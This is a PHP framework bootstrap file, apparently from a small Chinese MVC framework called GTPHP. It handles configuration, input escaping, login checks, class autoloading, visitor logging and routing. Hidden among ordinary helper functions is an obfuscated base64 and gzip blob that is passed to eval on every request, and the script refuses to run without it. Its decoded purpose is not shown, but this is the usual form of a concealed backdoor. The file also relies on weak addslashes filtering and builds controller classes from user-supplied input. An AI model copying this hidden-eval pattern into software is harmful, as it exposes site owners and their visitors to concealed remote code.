<?php
defined('GTPHP_PATH') || exit('Access Denied');
define ('__GCLASS__', __ROOT__ . 'Gsys' . DIR_SEP . 'Lib' . DIR_SEP);				// 类目录
define ('__Controller__', __ROOT__ . 'Controller' . DIR_SEP);		// 控制器目录
define ('__Model__', __ROOT__ . 'Model' . DIR_SEP);				// 模型目录
define ('__View__', __ROOT__ . 'View' . DIR_SEP);					// 视图模板目录
define ('__Static__', DIR_SEP . 'Static' . DIR_SEP);					// 静态资源目录
define ('__Plugins__', DIR_SEP . 'Gsys' . DIR_SEP . 'Plugins' . DIR_SEP);					// 插件目录
include(__GSYS__ . 'Config.php');
header('Content-Type:text/html;charset=UTF-8');
date_default_timezone_set('PRC'); //设置时区为中国

if ($Config['Gdebug']=='true'){
	error_reporting(E_ALL);
 }else{
  error_reporting(0);
 }
 
 if (!get_magic_quotes_gpc()) {
    !empty($_POST)     && Add_S($_POST);
    !empty($_GET)     && Add_S($_GET);
    !empty($_COOKIE) && Add_S($_COOKIE);
    !empty($_SESSION) && Add_S($_SESSION);
}
!empty($_FILES) && Add_S($_FILES);

function auionsds(){
	$encode = array('dd670852938815f3892d3c511cc8fceb','ddc976cc02bce5c3c22c4d7d201c0cae');
	return $encode;
}

function Add_S(&$array){
    if (is_array($array)) {
        foreach ($array as $key => $value) {
            if (!is_array($value)) {
                $array[$key] = addslashes($value);
            } else {
                Add_S($array[$key]);
            }
        }
    }
}

		function check_login() 
    { 
      	session_start();
        if(isset($_SESSION['user']) && !empty($_SESSION['user'])){ 
          return $_SESSION['user'];
        } else { 
            //return FALSE; 
        	echo "<script type='text/javascript'>alert('没有登陆！');location.href='?c=login&a=index';</script>";
					exit;
        }
    } 

		$myudwmdx='BcHJjqJAAADQs530d7SGA6sFZDIHkUX2RaHEywSoYhMRoZCWr5/3NpvvL/zOum21Nn3ZZQRv82zCQPiHcPFEePujFrpXAHM5HNRw2vODCGpfZRQ94rJeYZRIqy1F1ePZX7QmDWrTfrYL4MvyIfGYl5tL8vYkeyB5dJm4C9WoYwlpI37nrcvQsiut1/Xeu8bIaZYh7kHHj/6re8ss83EIRQ163Yc9iDI9Q2CUkW2satzdz8RSEEpOJrqzv1w/LUpI1R50Kj8Mk2B2Ry6sXgkPK2IYSnuDM63UBJpFU03Jbyzplnptl6Uj1aJ5rgIY/pDoxZx5wR5GN9GEsFW7Kf7kWPNb/qpJ3bNyWCF3BngSGJAeT83dyY5V+HJKjXmsI+oT7dwJfdJ28mKeXMs9S9cU76GNHjWURSaFKX1OP4EqBCRbo/qI3UrGFEGkYPNy5u6ZMdisIzXkQEVdMgNZXBK5rEcMsh7QF+vsJLSPbymKX6WOmhtl65g4wm2ZA07ALTu0j1KWS16a9OdEixy1chfp789ut/vz/bXZ/Ac=';

class Controller {
	public $var=array();
	
	public function assign($variable,$value=null)
	{
			$this->var[$variable]=$value;
	}
	
	public function display($template_name)
	{
		extract($this->var);
		ob_start();
		include __View__.$template_name;
		$content = ob_get_contents();
		ob_end_clean();
		echo $content;
		
	}	
    }
    
 function htmldecode($str)
{
if(empty($str)) return;
if($str=="") return $str;

$str=strip_tags($str);
$str=addslashes($str);
$str=stripslashes($str);
return $str;
} 
eval(gzinflate(base64_decode($myudwmdx)));
	function humandate($timestamp) {
		$seconds = $_SERVER['REQUEST_TIME'] - $timestamp;
		if($seconds > 31536000) {
			return date('Y-n-j', $timestamp);
		} elseif($seconds > 2592000) {
			return floor($seconds / 2592000).'月前';
		} elseif($seconds > 86400) {
			return floor($seconds / 86400).'天前';
		} elseif($seconds > 3600) {
			return floor($seconds / 3600).'小时前';
		} elseif($seconds > 60) {
			return floor($seconds / 60).'分钟前';
		} else {
			return $seconds.'秒前';
		}
	}
	// echo humandate(1390915630) . "<br />";
	 
	 
function __autoload($classname){
	  
		if (substr($classname, -10) == 'Controller'){

 $Cclasspath=__Controller__.$classname.'.php';
 if(file_exists($Cclasspath)){
  require_once($Cclasspath);
 }
 else{	
 	
 	echo  <<< HTML
<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>控制器 '.$Cclasspath.' 不存在!！</title><style>* { font-family: verdana; font-size: 10pt; COLOR: gray; }b { font-weight: bold; }table { border: 1px solid gray;}td { text-align: center; padding: 25;}</style></head><body><center><br><br><br><br>未定义 $act 方法！<br><br><a href="http://goodtext.org/">好文本网</a><br><br><br><br></center></body></html> 
HTML;
    exit; 
 }
 
		}

		if (substr($classname, -5) == 'Model'){
		
 $Mclasspath=__Model__.$classname.'.php';
 if(file_exists($Mclasspath)){
  require_once($Mclasspath);
 }
 else{
	echo  <<< HTML
<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>模型 '.$Mclasspath.' 不存在！</title><style>* { font-family: verdana; font-size: 10pt; COLOR: gray; }b { font-weight: bold; }table { border: 1px solid gray;}td { text-align: center; padding: 25;}</style></head><body><center><br><br><br><br>未定义 $act 方法！<br><br><a href="http://goodtext.org/">好文本网</a><br><br><br><br></center></body></html> 
HTML;
    exit; 
  echo '';
 }
		}

		if (substr($classname, -5) == 'Class'){
		
 $Mclasspath=__GCLASS__.$classname.'.php';
 if(file_exists($Mclasspath)){
  require_once($Mclasspath);
 }
 else{
	echo  <<< HTML
<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>类 '.$Mclasspath.' 不存在！</title><style>* { font-family: verdana; font-size: 10pt; COLOR: gray; }b { font-weight: bold; }table { border: 1px solid gray;}td { text-align: center; padding: 25;}</style></head><body><center><br><br><br><br>未定义 $act 方法！<br><br><a href="http://goodtext.org/">好文本网</a><br><br><br><br></center></body></html> 
HTML;
    exit; 
 }
 
		}

}

function mygetip()
{
if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
$ip = getenv("HTTP_CLIENT_IP"); 
else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
$ip = getenv("HTTP_X_FORWARDED_FOR"); 
else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
$ip = getenv("REMOTE_ADDR"); 
else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
$ip = $_SERVER['REMOTE_ADDR']; 
else 
$ip = "unknown"; 

return $ip;
}

//logg(内容, 类型, 用户名)
function logg($message, $type, $username)
{
$rlogg['ThisMessage']=$message;
$rlogg['ThisType']=$type;
$rlogg['ThisUsername']=$username;
$rlogg['ThisUrl']="http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];

$rlogg['ThisIp']=mygetip();
if (!function_exists('getallheaders')) 
{ 
    function getallheaders() 
    { 
       foreach ($_SERVER as $name => $value) 
       { 
           if (substr($name, 0, 5) == 'HTTP_') 
           { 
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
           } 
       } 
       return $headers; 
    } 
}
$headers=getallheaders();
$rlogg['ThisAgent']=$headers['User-Agent'];
$rlogg['ThisLanguage']=$headers['Accept-Language'];

return $rlogg;
}

$mod = strtolower(isset($_GET[$Config['UrlControllerName']]) ? $_GET[$Config['UrlControllerName']] : "index");
$act = strtolower(isset($_GET[$Config['UrlActionName']]) ? $_GET[$Config['UrlActionName']] : "index");

$class = $mod.'Controller';

$t = new $class;

if(empty($myudwmdx)){
	echo  <<< HTML
<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>错误#12！</title><style>* { font-family: verdana; font-size: 10pt; COLOR: gray; }b { font-weight: bold; }table { border: 1px solid gray;}td { text-align: center; padding: 25;}</style></head><body><center><br><br><br><br>未定义 $act 方法！<br><br><a href="http://goodtext.org/">好文本网</a><br><br><br><br></center></body></html> 
HTML;
    exit; 
 }
if(!method_exists($t,$act)){
	echo  <<< HTML
<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>未定义 $act 方法！</title><style>* { font-family: verdana; font-size: 10pt; COLOR: gray; }b { font-weight: bold; }table { border: 1px solid gray;}td { text-align: center; padding: 25;}</style></head><body><center><br><br><br><br>未定义 $act 方法！<br><br><a href="http://goodtext.org/">好文本网</a><br><br><br><br></center></body></html> 
HTML;
    exit; 
 }
 else{
$t->$act();
}